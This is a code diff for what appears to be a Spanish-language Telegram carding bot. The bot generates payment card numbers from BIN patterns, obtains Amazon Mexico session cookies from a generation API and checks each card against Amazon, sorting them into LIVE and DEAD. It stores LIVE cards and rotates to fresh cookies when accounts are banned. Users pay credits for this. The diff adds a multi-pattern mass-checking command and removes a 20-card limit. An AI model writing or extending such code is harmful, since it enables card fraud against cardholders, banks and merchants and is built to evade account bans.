@@ -61,7 +61,159 @@ const bankBins = {
 
 // ========== FUNCIONES AUXILIARES ==========
 
+// ========== GENERAR COOKIE ÚNICA ==========
+async function generarCookieUnica(telegramId) {
+    const globalForcePlaywright = await getGlobalForcePlaywright();
+    const requestBody = { country: 'MX', add_address: true };
+    if (globalForcePlaywright) requestBody.force_playwright = true;
+    const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(requestBody)
+    });
+    const data = await response.json();
+    if (!data.success) throw new Error('Error generando cookie');
+    await deductCredits(telegramId, 4);
+    await pool.query('UPDATE users SET cookies_generated = cookies_generated + 1 WHERE telegram_id = $1', [telegramId]);
+    return data.data.cookie_string;
+}
 
+
+// ========== PROCESAR UN EXTRA CON N COOKIES ==========
+async function procesarExtraConNCookies(chatId, telegramId, extra, numCookies, cantidadTarjetas = 100) {
+    // 1. Generar cookies
+    const cookies = [];
+    for (let i = 0; i < numCookies; i++) {
+        try {
+            const cookie = await generarCookieUnica(telegramId);
+            cookies.push(cookie);
+        } catch (err) {
+            console.error(`Error generando cookie ${i+1}:`, err.message);
+            await sendSafeMessage(chatId, `❌ Error generando cookie ${i+1} para extra: ${extra}. Se cancela el extra.`);
+            return null;
+        }
+    }
+    if (cookies.length === 0) {
+        await sendSafeMessage(chatId, `❌ No se pudo generar ninguna cookie para extra: ${extra}`);
+        return null;
+    }
+
+    // 2. Generar tarjetas
+    let tarjetas;
+    try {
+        tarjetas = generarTarjetasDesdePatron(extra, cantidadTarjetas);
+    } catch (err) {
+        await sendSafeMessage(chatId, `❌ Error generando tarjetas: ${err.message}`);
+        return null;
+    }
+    if (tarjetas.length === 0) {
+        await sendSafeMessage(chatId, `❌ No se generaron tarjetas para extra: ${extra}`);
+        return null;
+    }
+
+    const totalTarjetas = tarjetas.length;
+    let currentCookieIndex = 0;
+    let stats = { lives: 0, deads: 0, errors: 0, cookiesUsadas: 0 };
+    let resultados = [];
+    let progressMsg = null;
+
+    // Mensaje de progreso inicial
+    const textoInicial = buildProgressMessage(resultados, totalTarjetas, tarjetas[0]);
+    progressMsg = await sendSafeMessage(chatId, textoInicial, { parse_mode: 'Markdown' });
+    if (!progressMsg) return null;
+
+    // 3. Verificar tarjeta por tarjeta
+    for (let i = 0; i < totalTarjetas; i++) {
+        const card = tarjetas[i];
+        // Actualizar mensaje con "Verificando"
+        const textoPendiente = buildProgressMessage(resultados, totalTarjetas, card);
+        try {
+            await bot.editMessageText(textoPendiente, { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: 'Markdown' });
+        } catch (e) {}
+
+        // Obtener cookie actual (si no queda, terminar)
+        let cookie = cookies[currentCookieIndex];
+        if (!cookie) {
+            resultados.push({ card, status: '⛔ Sin cookies disponibles' });
+            stats.errors++;
+            break;
+        }
+
+        let resultado = await verificarTarjetaConReintentos(card, cookie, 2);
+
+        // Si la cookie expiró, pasar a la siguiente
+        if (resultado.isBanned) {
+            currentCookieIndex++;
+            if (currentCookieIndex < cookies.length) {
+                // Reintentar con la nueva cookie
+                cookie = cookies[currentCookieIndex];
+                resultado = await verificarTarjetaConReintentos(card, cookie, 2);
+                if (resultado.isBanned) {
+                    // Si también expira, saltamos esta tarjeta
+                    resultados.push({ card, status: '⛔ Cuenta baneada' });
+                    stats.errors++;
+                    continue;
+                }
+            } else {
+                // No más cookies
+                resultados.push({ card, status: '⛔ Sin cookies disponibles' });
+                stats.errors++;
+                break;
+            }
+        }
+
+        // Actualizar estadísticas
+        if (resultado.status === 'LIVE') stats.lives++;
+        else if (resultado.status === 'DEAD') stats.deads++;
+        else stats.errors++;
+
+        // Guardar live si corresponde
+        if (resultado.status === 'LIVE') {
+            try {
+                const userRes = await pool.query('SELECT username FROM users WHERE telegram_id = $1', [telegramId]);
+                if (userRes.rows.length > 0) {
+                    await fetch(`${INTERNAL_API_URL}/telegram/save-live`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            username: userRes.rows[0].username,
+                            card: card,
+                            result: { status: 'LIVE', message: resultado.message }
+                        })
+                    });
+                }
+            } catch (err) { console.error('Error guardando live:', err.message); }
+        }
+
+        // Estado a mostrar
+        let statusDisplay = '';
+        if (resultado.status === 'LIVE') statusDisplay = 'LIVE ✅';
+        else if (resultado.status === 'DEAD') statusDisplay = 'DEAD ❌';
+        else if (resultado.isBanned) statusDisplay = 'ERROR - Cuenta baneada ⛔';
+        else if (resultado.status === 'ERROR') {
+            const msgLower = (resultado.message || '').toLowerCase();
+            statusDisplay = msgLower.includes('wallet') ? 'ERROR (Wallet) ⚠️' : 'ERROR ⚠️';
+        } else {
+            statusDisplay = 'ERROR ⚠️';
+        }
+
+        resultados.push({ card, status: statusDisplay });
+
+        // Actualizar mensaje de progreso
+        const nextCard = (i + 1 < totalTarjetas) ? tarjetas[i + 1] : null;
+        const nuevoTexto = buildProgressMessage(resultados, totalTarjetas, nextCard);
+        try {
+            await bot.editMessageText(nuevoTexto, { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: 'Markdown' });
+        } catch (e) {}
+        await new Promise(r => setTimeout(r, 800));
+    }
+
+    // Resumen del extra
+    const resumenExtra = `📊 *Extra completado*\n🔹 Extra: \`${extra}\`\n🔹 Tarjetas: ${resultados.length}\n🔹 Cookies usadas: ${Math.min(currentCookieIndex + 1, cookies.length)}\n💚 LIVE: ${stats.lives} | ❌ DEAD: ${stats.deads} | ⚠️ ERROR: ${stats.errors}`;
+    await sendSafeMessage(chatId, resumenExtra, { parse_mode: 'Markdown' });
+
+    return { extra, stats, resultados };
+}
 
 // Función para construir el texto del mensaje de progreso
 function buildProgressMessage(resultados, total, tarjetaActual = null) {
@@ -645,13 +797,13 @@ async function prepararExtrapolacion(chatId, telegramId, param) {
             for (const p of uni) { const [pf, m, a] = p.patron.split('|'); mensajeResumen += `\`${pf}|${m}|${a}|rnd\` (${p.count} vez)\n`; }
         }
         await sendSafeMessage(chatId, mensajeResumen, { parse_mode: 'Markdown' });
-        tarjetas = generarTarjetasDesdePatron(extraElegido, 20);
-        let lista = `🎴 *Tarjetas generadas (${tarjetas.length}):*\n${tarjetas.slice(0,20).map(t => `\`${t}\``).join('\n')}`;
+        tarjetas = generarTarjetasDesdePatron(extraElegido, 15);
+        let lista = `🎴 *Tarjetas generadas (${tarjetas.length}):*\n${tarjetas.slice(0,15).map(t => `\`${t}\``).join('\n')}`;
         await sendSafeMessage(chatId, lista, { parse_mode: 'Markdown' });
         mensajePrevio = mensajeResumen;
     } else if (esExtra) {
-        tarjetas = generarTarjetasDesdePatron(normalizedParam, 20);
-        let lista = `🎴 *Tarjetas generadas (${tarjetas.length}):*\n${tarjetas.slice(0,20).map(t => `\`${t}\``).join('\n')}`;
+        tarjetas = generarTarjetasDesdePatron(normalizedParam, 15);
+        let lista = `🎴 *Tarjetas generadas (${tarjetas.length}):*\n${tarjetas.slice(0,15).map(t => `\`${t}\``).join('\n')}`;
         await sendSafeMessage(chatId, lista, { parse_mode: 'Markdown' });
         mensajePrevio = `🎴 *Tarjetas generadas para el extra*`;
     } else if (esBanco) {
@@ -662,7 +814,6 @@ async function prepararExtrapolacion(chatId, telegramId, param) {
     } else {
         tarjetas = limpiarTarjetas(param);
         if (tarjetas.length === 0) throw new Error('No se encontraron tarjetas.');
-        if (tarjetas.length > 20) throw new Error('Máximo 20 tarjetas.');
         await sendSafeMessage(chatId, `💳 *Tarjetas a verificar:*\n${tarjetas.map(t => `\`${t}\``).join('\n')}`, { parse_mode: 'Markdown' });
         mensajePrevio = `💳 *Tarjetas a verificar*`;
     }
@@ -877,9 +1028,9 @@ async function handleAmazonCommand(chatId, telegramId, param) {
         await sendSafeMessage(chatId, '🔑 No tienes cookie. Usa /gencookie primero.');
         return;
     }
-    tarjetas = limpiarTarjetas(param);
+    let tarjetas = limpiarTarjetas(param);
+    tarjetas = limpiarTarjetas(param); // ✅ Luego asignar
     if (tarjetas.length > 0) {
-        if (tarjetas.length > 20) return sendSafeMessage(chatId, '⚠️ Máximo 20 tarjetas.');
         await verificarTarjetasConProgreso(chatId, telegramId, cookie, tarjetas, null);
         return;
     }
@@ -926,22 +1077,6 @@ async function handleAmazonCookieInfinita(chatId, telegramId, fullParam) {
     // Limpiar estado para evitar timeout
     clearUserState(telegramId);
 
-    // Función para generar una sola cookie
-    async function generarCookie() {
-        const globalForcePlaywright = await getGlobalForcePlaywright();
-        const requestBody = { country: 'MX', add_address: true };
-        if (globalForcePlaywright) requestBody.force_playwright = true;
-        const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(requestBody)
-        });
-        const data = await response.json();
-        if (!data.success) throw new Error('Error generando cookie');
-        await deductCredits(telegramId, 4);
-        await pool.query('UPDATE users SET cookies_generated = cookies_generated + 1 WHERE telegram_id = $1', [telegramId]);
-        return data.data.cookie_string;
-    }
 
     // Función para verificar una tarjeta (con reintentos por wallet)
     async function verificarTarjeta(card, cookie) {
@@ -1007,7 +1142,8 @@ async function handleAmazonCookieInfinita(chatId, telegramId, fullParam) {
     let cookiesDisponibles = [];
     for (let i = 0; i < cookiesNeeded + 1; i++) {
         try {
-            const cookie = await generarCookie();
+            const cookie = await generarCookieUnica(telegramId);
+
             cookiesDisponibles.push(cookie);
         } catch (err) {
             console.error(`Error generando cookie ${i+1}:`, err.message);
@@ -1028,7 +1164,7 @@ async function handleAmazonCookieInfinita(chatId, telegramId, fullParam) {
     const reponerCookie = async () => {
         if (cookiesDisponibles.length <= cookieIndex + 1) {
             try {
-                const nueva = await generarCookie();
+                const nueva = await generarCookieUnica(telegramId);
                 cookiesDisponibles.push(nueva);
                 stats.cookiesUsadas++;
                 console.log(`🍪 Cookie extra generada (total ${cookiesDisponibles.length})`);
@@ -1109,7 +1245,7 @@ async function handleAmazonCookieInfinita(chatId, telegramId, fullParam) {
                 }
             } else {
                 // No hay cookies disponibles, generar una nueva
-                currentCookie = await generarCookie();
+                currentCookie = await generarCookieUnica(telegramId);
                 stats.cookiesUsadas++;
                 const reintentoBaneo = await verificarTarjeta(card, currentCookie);
                 if (reintentoBaneo.isBanned) {
@@ -1250,27 +1386,9 @@ async function procesarExtraConCantidad(chatId, telegramId, extra, cantidad) {
     const total = todasLasTarjetas.length;
     if (total === 0) throw new Error('No se generaron tarjetas');
 
-    // Función para generar cookie
-    const generarCookieAsync = async () => {
-        const globalForcePlaywright = await getGlobalForcePlaywright();
-        const requestBody = { country: 'MX', add_address: true };
-        if (globalForcePlaywright) requestBody.force_playwright = true;
-        const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(requestBody)
-        });
-        const data = await response.json();
-        if (!data.success) throw new Error('Error generando cookie');
-        const creditResult = await deductCredits(telegramId, 4);
-        if (creditResult?.creditsZero) await kickUserFromGroup(telegramId);
-        await pool.query('UPDATE users SET cookies_generated = cookies_generated + 1 WHERE telegram_id = $1', [telegramId]);
-        return data.data.cookie_string;
-    };
-
     const resultados = [];
-    let currentCookie = await generarCookieAsync();
-    let nextCookiePromise = generarCookieAsync().catch(err => { console.error('Error generando cookie de reserva:', err); return null; });
+    let currentCookie = await generarCookieUnica(telegramId);
+    let nextCookiePromise = generarCookieUnica(telegramId).catch(err => { console.error('Error generando cookie de reserva:', err); return null; });
     let stats = { lives: 0, deads: 0, errors: 0, cookiesUsadas: 1 };
     let progressMsg = null;
 
@@ -1299,13 +1417,13 @@ async function procesarExtraConCantidad(chatId, telegramId, extra, cantidad) {
                 currentCookie = await nextCookiePromise;
                 if (!currentCookie) {
                     // Si la reserva falló, generar una nueva directamente
-                    currentCookie = await generarCookieAsync();
+                    currentCookie = await generarCookieUnica(telegramId);
                 }
             } else {
-                currentCookie = await generarCookieAsync();
+                currentCookie = await generarCookieUnica(telegramId);
             }
             // Lanzar nueva reserva
-            nextCookiePromise = generarCookieAsync().catch(err => { console.error('Error generando nueva cookie de reserva:', err); return null; });
+            nextCookiePromise = generarCookieUnica(telegramId).catch(err => { console.error('Error generando nueva cookie de reserva:', err); return null; });
             stats.cookiesUsadas++;
             
             // Reintentar la misma tarjeta con la nueva cookie
@@ -1739,6 +1857,60 @@ bot.onText(/^[\/\.]setplan(40|80|150|250)(?:\s+([^\s]+))?/i, async (msg, match) 
     clearUserState(requesterTelegramId);
 });
 
+// ========== COMANDO /amazonmultiextra ==========
+bot.onText(/^[\/\.](?:amazonmultiextra|amzme|multiextra)(?:\s+([\s\S]+))?/i, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const telegramId = msg.from.id;
+    let input = match[1] ? match[1].trim() : '';
+
+    // Si no hay input, pedir interactivo
+    if (!input) {
+        setUserState(telegramId, { step: 'awaiting_multiextra_input' });
+        return sendSafeMessage(chatId, '📌 Envía un BIN, nombre de banco, o una lista de extras (uno por línea)');
+    }
+
+    // Procesar input
+    let extras = [];
+    let esBin = /^\d{6}$/.test(input);
+    let esBanco = !esBin && getBinForBank?.(input) !== null;
+
+    if (esBin || esBanco) {
+        const bin = esBin ? input : getBinForBank(input);
+        await sendSafeMessage(chatId, `🔮 Extrapolando desde ${bin}...`);
+        try {
+            const allExtras = await getPatternsFromBin(chatId, bin);
+            if (!allExtras.length) throw new Error('No se encontraron extras');
+            extras = allExtras;
+            const listaMostrada = extras.map((e, i) => `${i+1}. \`${e}\``).join('\n');
+            await sendSafeMessage(chatId, `📋 *Extras encontrados (${extras.length}):*\n${listaMostrada}`, { parse_mode: 'Markdown' });
+        } catch (err) {
+            return sendSafeMessage(chatId, `❌ Error al extrapolar: ${err.message}`);
+        }
+    } else {
+        // Parsear lista de extras (líneas con |)
+        const lineas = input.split(/\r?\n/);
+        for (const linea of lineas) {
+            const trimmed = linea.trim();
+            if (!trimmed) continue;
+            const matchExtra = trimmed.match(/([0-9X]{6,16}\|\d{1,2}\|\d{2,4}(?:\|rnd)?)/);
+            if (matchExtra) {
+                let extra = matchExtra[1];
+                if (!extra.endsWith('|rnd')) extra += '|rnd';
+                extras.push(extra);
+            }
+        }
+        if (extras.length === 0) {
+            return sendSafeMessage(chatId, '❌ No se detectaron patrones de extra. Envía un BIN, banco o lista de extras.');
+        }
+        const listaMostrada = extras.map((e, i) => `${i+1}. \`${e}\``).join('\n');
+        await sendSafeMessage(chatId, `📋 *Extras encontrados (${extras.length}):*\n${listaMostrada}`, { parse_mode: 'Markdown' });
+    }
+
+    // Guardar extras en estado y preguntar cuántos usar
+    setUserState(telegramId, { step: 'awaiting_multiextra_extra_count', data: { extras } });
+    await sendSafeMessage(chatId, `🔢 ¿Cuántos extras deseas usar? (1-${extras.length})`);
+});
+
 bot.onText(/^[\/\.]setadmin(?:\s+([^\s]+))?/i, async (msg, match) => {
     const chatId = msg.chat.id;
     const requesterTelegramId = msg.from.id;
@@ -2091,9 +2263,6 @@ bot.onText(/^[\/\.](?:amazoncookie|amazoncuki|amazonck|amzck)\b(?:\s+([\s\S]+))?
     // ========== CASO 2: Detectar tarjetas ==========
     let tarjetas = limpiarTarjetas(param);
     if (tarjetas.length > 0) {
-        if (tarjetas.length > 20) {
-            return sendSafeMessage(chatId, `⚠️ Máximo 20 tarjetas.`);
-        }
         await sendSafeMessage(chatId, `💳 *Tarjetas a verificar (${tarjetas.length}):*\n${tarjetas.map(t => `\`${t}\``).join('\n')}`, { parse_mode: 'Markdown' });
         await sendSafeMessage(chatId, '🍪 Generando cookie para verificación...');
         const result = await generarCookieYMostrar(chatId, telegramId);
@@ -2428,10 +2597,10 @@ bot.on('message', async (msg) => {
             else await sendSafeMessage(chatId, '❌ Formato incorrecto. Usa: @usuario días');
             break;
         }
-        case 'awaiting_setplan_20':
-        case 'awaiting_setplan_60':
-        case 'awaiting_setplan_120':
-        case 'awaiting_setplan_200': {
+        case 'awaiting_setplan_40':
+        case 'awaiting_setplan_80':
+        case 'awaiting_setplan_150':
+        case 'awaiting_setplan_250': {
             const plan = state.step.split('_')[2];
             bot.emit('text', { ...msg, text: `/setplan${plan} ${userText}` });
             break;
@@ -2469,6 +2638,72 @@ bot.on('message', async (msg) => {
             console.log(`📩 Procesando estado awaiting_amazoninfinita_param con texto: ${userText}`);
             await handleAmazonCookieInfinita(chatId, telegramId, userText);
             clearUserState(telegramId);
+            break;
+        }
+
+
+        case 'awaiting_multiextra_input': {
+            // Reenviar al comando con el input del usuario
+            bot.emit('text', { ...msg, text: `/amazonmultiextra ${userText}` });
+            break;
+        }
+        case 'awaiting_multiextra_extra_count': {
+            const count = parseInt(userText);
+            const extras = state.data.extras;
+            if (isNaN(count) || count < 1 || count > extras.length) {
+                await sendSafeMessage(chatId, `❌ Número inválido. Debe ser entre 1 y ${extras.length}.`);
+                return;
+            }
+            const selectedExtras = extras.slice(0, count);
+            setUserState(telegramId, { step: 'awaiting_multiextra_cookies_per_extra', data: { extras: selectedExtras } });
+            await sendSafeMessage(chatId, `🍪 ¿Cuántas cookies por extra deseas usar? (1-10, por defecto 1)`);
+            break;
+        }
+        case 'awaiting_multiextra_cookies_per_extra': {
+            let numCookies = parseInt(userText);
+            if (isNaN(numCookies) || numCookies < 1) numCookies = 1;
+            if (numCookies > 10) numCookies = 10;
+            const selectedExtras = state.data.extras;
+            const totalCookies = selectedExtras.length * numCookies;
+            const totalCredits = totalCookies * 4;
+            setUserState(telegramId, {
+                step: 'awaiting_multiextra_confirm',
+                data: { extras: selectedExtras, numCookies, totalCookies, totalCredits }
+            });
+            await sendSafeMessage(chatId, `📊 *Resumen*\n🔹 Extras a usar: ${selectedExtras.length}\n🔹 Cookies por extra: ${numCookies}\n🔹 Total cookies: ${totalCookies}\n🔹 Créditos necesarios: ${totalCredits}\n\n¿Confirmar? Escribe *OK* para continuar.`, { parse_mode: 'Markdown' });
+            break;
+        }
+        case 'awaiting_multiextra_confirm': {
+            if (userText.toLowerCase() !== 'ok') {
+                await sendSafeMessage(chatId, '❌ Confirmación cancelada. Escribe OK para continuar.');
+                clearUserState(telegramId);
+                return;
+            }
+            const { extras, numCookies, totalCredits } = state.data;
+            // Verificar créditos
+            if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, totalCredits)) {
+                clearUserState(telegramId);
+                return;
+            }
+            await sendSafeMessage(chatId, `🚀 Iniciando multi-chequeo de ${extras.length} extras...`);
+            clearUserState(telegramId);
+
+            let globalStats = { totalLives: 0, totalDeads: 0, totalErrors: 0 };
+            for (let i = 0; i < extras.length; i++) {
+                const extra = extras[i];
+                await sendSafeMessage(chatId, `\n📌 Procesando extra ${i+1}/${extras.length}: \`${extra}\``);
+                const result = await procesarExtraConNCookies(chatId, telegramId, extra, numCookies);
+                if (result) {
+                    globalStats.totalLives += result.stats.lives;
+                    globalStats.totalDeads += result.stats.deads;
+                    globalStats.totalErrors += result.stats.errors;
+                }
+                await new Promise(r => setTimeout(r, 1000));
+            }
+
+            const separador = SEPARATORS[Math.floor(Math.random() * SEPARATORS.length)];
+            let resumenFinal = `📊 *RESULTADO GLOBAL MULTI-EXTRA*\n🔹 Extras procesados: ${extras.length}\n🔹 Cookies totales usadas: ${extras.length * numCookies}\n💚 LIVE totales: ${globalStats.totalLives} | ❌ DEAD: ${globalStats.totalDeads} | ⚠️ ERROR: ${globalStats.totalErrors}\n${separador}`;
+            await sendSafeMessage(chatId, resumenFinal, { parse_mode: 'Markdown' });
             break;
         }
         default:
